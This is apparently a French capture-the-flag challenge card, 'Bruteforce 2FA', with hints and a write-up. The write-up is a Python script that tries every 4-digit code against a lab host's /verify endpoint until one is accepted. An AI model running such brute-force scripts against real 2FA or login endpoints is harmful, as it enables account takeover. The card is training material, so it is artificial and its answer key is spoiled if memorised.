# 29 - Bruteforce 2FA

## Nom du Challenge
Bruteforce 2FA

## Description
Un portail SSH secondaire impose un code 2FA à 4 chiffres. Le verrouillage est mal implémenté et scriptable.

## Difficulté
Difficile

## Points
300 pts

## Format du Flag
IPNET{mot_de_passe_ou_cle}

## Hints
1. 4 chiffres = 0000 à 9999.
2. Automatise les tentatives avec Python.
3. Arrête-toi dès qu'un code valide est détecté.

## Solution (Write-up)
```bash
python - <<'PY'
import requests
url='http://10.10.10.29/verify'
for i in range(10000):
    code=f'{i:04d}'
    try:
        r=requests.post(url,data={'code':code},timeout=3)
    except requests.RequestException as exc:
        print('Network error:', exc)
        continue
    if 'OK' in r.text:
        print('Valid:', code)
        break
PY
```
